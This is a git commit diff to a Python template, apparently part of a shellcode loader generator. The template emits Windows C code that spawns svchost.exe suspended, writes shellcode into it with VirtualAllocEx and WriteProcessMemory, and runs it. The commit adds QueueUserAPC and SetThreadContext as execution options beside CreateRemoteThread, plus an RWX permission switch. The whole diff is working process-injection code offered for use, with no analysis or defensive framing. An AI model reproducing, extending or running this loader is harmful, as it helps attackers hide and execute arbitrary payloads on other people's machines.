c791b64ada8b14629deebba13a05cf9b21057ffc
Bill Chenyoung <bchenyoung@gmail.com>
2026-09-18 17:55:12 +1000

    integrated setthreadcontext and queueuserapc into spawnandinject

--- c/templates/spawnandinject.py
+++ c/templates/spawnandinject.py
@@ -6,11 +6,38 @@ class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
         self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        self.execution = 'CreateRemoteThread'
+        if 'execution' in arguments:
+            self.execution = arguments['execution']
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
         if 'target' in arguments:
             self.target = arguments['target'].replace('\\','\\\\')
+
+        if self.execution == 'CreateRemoteThread':
+            self.executionCode = """
+    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    WaitForSingleObject(hThread, 500);
+    CloseHandle(hThread);
+    """
+        elif self.execution == 'QueueUserAPC':
+            self.executionCode = """
+    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pRemoteCode;
+    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, (ULONG_PTR)NULL);
+    ResumeThread(pi.hThread);
+"""
+        elif self.execution == 'SetThreadContext':
+            self.executionCode = """
+    CONTEXT ctx = {{ 0 }};
+    ctx.ContextFlags = CONTEXT_CONTROL; // e.g., RIP/RSP/EBP
+    if (GetThreadContext(pi.hThread, &ctx)) {{
+        // Modify target register, e.g., ctx.Rip = newAddress;
+        ctx.Rip = (DWORD64)pRemoteCode;
+        SetThreadContext(pi.hThread, &ctx);
+    }}
+    ResumeThread(pi.hThread);
+"""
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -42,13 +69,10 @@ class spawnandinject:
 
     CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    LPVOID pRemoteCode = NULL;
-    HANDLE hThread = NULL;
-
-    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
+    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
-    hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
-    WaitForSingleObject(hThread, 500);
-    CloseHandle(hThread);
-""").substitute(target=self.target, memoryPermission=self.memoryPermission)
+    $execution
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+""").substitute(target=self.target, memoryPermission=self.memoryPermission, execution=self.executionCode)
